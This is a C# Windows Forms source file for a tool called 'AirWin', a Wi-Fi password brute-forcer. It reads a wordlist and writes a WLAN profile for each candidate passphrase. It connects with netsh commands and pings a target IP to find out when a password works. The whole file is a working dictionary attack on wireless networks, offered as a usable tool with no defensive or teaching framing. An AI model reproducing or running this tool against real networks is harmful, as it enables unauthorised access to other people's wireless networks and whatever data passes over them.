using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Net.NetworkInformation;  

namespace PreubaNETSH
{
    public partial class AirWin : Form
        {






        private bool ping(string ip)
        {
            bool OK = false;
            Ping pingSender = new Ping();
            PingOptions options = new PingOptions();
            options.DontFragment = true;
            // Create a buffer of 32 bytes of data to be transmitted.  
            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            byte[] buffer = Encoding.ASCII.GetBytes(data);
            int timeout = 240;
            for (int i = 0; i < 4; i++)
            {
                PingReply reply = pingSender.Send(ip, timeout, buffer, options);
                OK = (reply.Status == IPStatus.Success)||OK;
            }
            return OK;
        }
        
        
        
        
        
        
        
        
        
        
        private void genera_profile(string clave, string diccionario,string essid,string tipo,string auth){
        System.IO.StreamWriter profile = new StreamWriter("PROFILE.XML");
        profile.WriteLine("<?xml version=\"1.0\"?>");
profile.WriteLine("<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">");
profile.WriteLine("	<name>airwin</name>");
profile.WriteLine("	<SSIDConfig>");
profile.WriteLine("		<SSID>");
profile.WriteLine("			<name>" + essid + "</name>");
profile.WriteLine("		</SSID>");
profile.WriteLine("		<nonBroadcast>true</nonBroadcast>");
profile.WriteLine("	</SSIDConfig>");
profile.WriteLine("	<connectionType>ESS</connectionType>");
profile.WriteLine("	<connectionMode>auto</connectionMode>");
profile.WriteLine("	<autoSwitch>false</autoSwitch>");
profile.WriteLine("	<MSM>");
profile.WriteLine("		<security>");
profile.WriteLine("			<authEncryption>");
profile.WriteLine("				<authentication>" + tipo + "</authentication>");
profile.WriteLine("				<encryption>" + auth + "</encryption>");
profile.WriteLine("				<useOneX>false</useOneX>");
profile.WriteLine("			</authEncryption>");
profile.WriteLine("			<sharedKey>");
profile.WriteLine("				<keyType>passPhrase</keyType>");
profile.WriteLine("				<protected>false</protected>");
profile.WriteLine("				<keyMaterial>" + clave + "</keyMaterial>");
profile.WriteLine("			</sharedKey>");
profile.WriteLine("		</security>");
profile.WriteLine("	</MSM>");
profile.WriteLine("</WLANProfile>");
profile.Close();





    }

        
        public AirWin()
        {
            InitializeComponent();
            label6.Visible = false;
            label5.Visible = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (essid.Text != "")
            {
                button1.Enabled = false;
                if (System.IO.File.Exists(diccionario.Text))
                {
                    string clave = "";
                    bool trobat = false;

                    System.Diagnostics.ProcessStartInfo add, connect, disconnect, delete;
                    add = new System.Diagnostics.ProcessStartInfo("CMD.EXE", "/C netsh wlan add profile filename=\"PROFILE.XML\"");
                    add.Verb = "open";
                    connect = new System.Diagnostics.ProcessStartInfo("CMD.EXE", "/C netsh wlan connect name=\"airwin\" ssid=\"" + essid.Text);
                    connect.Verb = "open";
                    disconnect = new System.Diagnostics.ProcessStartInfo("CMD.EXE", "/C netsh wlan disconnect ");
                    disconnect.Verb = "open";
                    delete = new System.Diagnostics.ProcessStartInfo("CMD.EXE", "/C netsh wlan delete profile name=\"airwin\" i=*");
                    delete.Verb = "open";


                    System.IO.StreamReader dicc = new StreamReader(diccionario.Text);
                    label5.Text = "Probando clave";
                    label5.Visible = true;
                    label6.Visible = true;
                    System.Diagnostics.Process.Start(disconnect);
                    Thread.Sleep(600);
                    while (!dicc.EndOfStream)
                    {

                        clave = dicc.ReadLine();
                        label6.Text = clave;

                        genera_profile(clave, diccionario.Text, essid.Text, (string)tipo1.SelectedItem, (string)auth2.SelectedItem);


                        System.Diagnostics.Process.Start(add);
                        Thread.Sleep(600);
                        System.Diagnostics.Process.Start(connect);


                     //   DelayExecution(Convert.ToInt32(delay.SelectedItem));
                        Thread.Sleep(Convert.ToInt32(delay.SelectedItem) * 1000);
                        trobat = ping(ip.Text);
                        if (trobat)
                        {

                            label6.Text = clave; break;
                        }

                        System.Diagnostics.Process.Start(disconnect);
                        Thread.Sleep(600);
                        System.Diagnostics.Process.Start(delete);
                        Thread.Sleep(600);



                    }
                    dicc.Close();
                }
                else { label6.Text = "El archivo no existe"; label6.Visible = true; }
                button1.Enabled = true;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            AboutBox1 form2 = new AboutBox1();
            form2.Show();
        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }
        
        private void openFileDialog1_FileOk_1(object sender, CancelEventArgs e)
        {
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            diccionario.Text = openFileDialog1.FileName;
        }
    }
}
